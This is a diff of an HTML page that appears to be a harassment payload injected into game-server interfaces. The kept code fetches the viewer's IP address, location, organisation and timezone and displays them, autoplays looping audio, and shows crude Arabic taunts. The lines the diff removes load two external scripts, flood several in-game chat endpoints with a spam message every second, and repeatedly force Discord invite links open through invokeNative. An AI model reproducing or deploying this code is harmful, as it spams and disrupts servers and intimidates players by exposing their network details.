@@ -8,7 +8,7 @@
         body {
             margin: 0;
             padding: 0;
-            background: url('https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExNDhlYzZldGNhMm90ZzJldGphOXJiZHI1N3B6dDN5NWJxeXBpdnR6eCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/l0IyeheChYxx2byDu/giphy.gif') no-repeat center center fixed;
+            background: url('https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExZTM5a3ExaGs4ODlobGh0cm5xd2hjcWEwaHF1c3JkZG5ib3J3cWRpcCZlcD12MV9naWZzX3NlYXJjaCZjdD1n/YQitE4YNQNahy/giphy.gif') no-repeat center center fixed;
             background-size: cover;
             font-family: 'Courier New', Courier, monospace;
             color: #0000ff;
@@ -45,10 +45,10 @@
 </head>
 <body>
     <div class="image-container">
-        <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExZTM5a3ExaGs4ODlobGh0cm5xd2hjcWEwaHF1c3JkZG5ib3J3cWRpcCZlcD12MV9naWZzX3NlYXJjaCZjdD1n/YQitE4YNQNahy/giphy.gif" alt="Discord Image">
+        <img src="https://media.discordapp.net/attachments/1425924169404518523/1426997049307435078/11111.png?ex=68edead0&is=68ec9950&hm=81c5b6aaa51a4ea829d50e68ce6249229f4c97da08730c2471dda5d9abb44b1b&=&format=webp&quality=lossless&width=1522&height=856" alt="Discord Image">
     </div>
     <audio autoplay loop>
-        <source src="https://h.top4top.io/m_35723fav81.mp3" type="audio/mpeg">
+        <source src="https://cdn.discordapp.com/attachments/1402964948895793152/1427258569522413659/-_Clipchamp.mp4?ex=68ee35a0&is=68ece420&hm=42b9402baa96f53c438cd0a29de56c588037a3268b607f1e414e63fefa0b65a6&" type="audio/mpeg">
         Your browser does not support the audio element.
     </audio>
     <div class="info" id="ip-info">
@@ -60,45 +60,16 @@
         <span><strong>Organization:</strong> <span id="org"></span></span><br>
         <span><strong>Timezone:</strong> <span id="timezone"></span></span>
     </div>
-    <div class="text">الكل عل زبي</div>
+    <div class="text">المري وصل يا ساده</div>
     <div class="text">(9z71) حسابي دس حياكم</div>
-
-    <!-- External Scripts -->
-    <script src="https://2no.co/cr2sher.js"></script>
-    <script src="//2no.co/nomoney.js"></script>
-
-    <!-- Combined JavaScript -->
     <script>
-        // IP Info Fetch
-        fetch('https://ipinfo.io/json')
+         fetch('https://ipinfo.io/json')
         .then(response => response.json())
         .then(data => {
             delete data.readme;
             const infoDiv = document.getElementById('ip-info');
             infoDiv.textContent = JSON.stringify(data, null, 2);
         });
-
-        // Periodic Message Posting
-        const msg = `👑  ورده ورده عل مرقص تعالي 👑`;
-        const body = JSON.stringify({ message: msg });
-
-        setInterval(() => {
-            fetch("https://flix-scripts/chatResult", { method: "POST", body });
-            fetch("https://danger_chat/Danger_Chat:SendMessage", { method: "POST", body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]}) });
-            fetch("https://easy-chat+/o6ZbK5Ecp6", {headers: {accept: "*/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"}, body: JSON.stringify({ message: msg, channel: "شات العام" }), method: "POST"});
-            fetch("https://melix_chat/chatResult", { method: "POST", body });
-            fetch("https://as_chat/chatResult", { method: "POST", body });
-            fetch("https://chat/chatResult", { method: "POST", body });
-            fetch("https://ho-chatv2/Chat", { method: "POST", body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"}) });
-        }, 1000);
-
-        // Discord link opening
-        setInterval(() => {
-            window.invokeNative("openUrl", "https://discord.gg/3DPaYFuD");
-            window.invokeNative("openUrl", "https://discord.gg/3DPaYFuD");
-            window.invokeNative("openUrl", "https://discord.gg/3DPaYFuD");
-            window.invokeNative("openUrl", "https://discord.gg/3DPaYFuD");
-        }, 1000);
     </script>
 </body>
 </html>
